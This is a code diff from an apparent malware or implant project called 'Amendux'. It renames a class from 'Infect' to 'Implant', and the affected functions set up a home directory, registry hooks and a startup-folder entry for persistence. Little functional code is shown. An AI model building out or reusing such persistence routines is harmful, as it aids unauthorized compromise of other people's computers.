@@ -2,25 +2,25 @@
 #include "Log.h"
 #include "Config.h"
 #include "RegDB.h"
-#include "Infect.h"
+#include "Implant.h"
 
 using namespace Amendux;
 
-Infect *Infect::s_Infect = nullptr;
+Implant *Implant::s_Infect = nullptr;
 
-Infect::Infect()
+Implant::Implant()
 {
 	LogInfo(L"Infect", L"Initialize infect class");
 }
 
 
-Infect::~Infect()
+Implant::~Implant()
 {
 	LogInfo(L"Infect", L"Terminate infect class");
 }
 
 
-void Infect::InitClass()
+void Implant::InitClass()
 {
 	if (!Config::Current()->CanInfect()) {
 		return;
@@ -32,7 +32,7 @@ void Infect::InitClass()
 }
 
 
-void Infect::SetupHomeDirectory()
+void Implant::SetupHomeDirectory()
 {
 	std::wstring curPath = Util::currentModule();
 	std::wstring appDir = Config::Current()->DataDirectory();
@@ -55,7 +55,7 @@ void Infect::SetupHomeDirectory()
 }
 
 
-void Infect::SetupRegisterHook()
+void Implant::SetupRegisterHook()
 {
 	LogInfo(L"Infect", L"Set register hooks");
 
@@ -68,7 +68,7 @@ void Infect::SetupRegisterHook()
 }
 
 
-void Infect::SetupStartupFolder()
+void Implant::SetupStartupFolder()
 {
 #if SECURE_DOUBLE_BOOT
 	// TODO
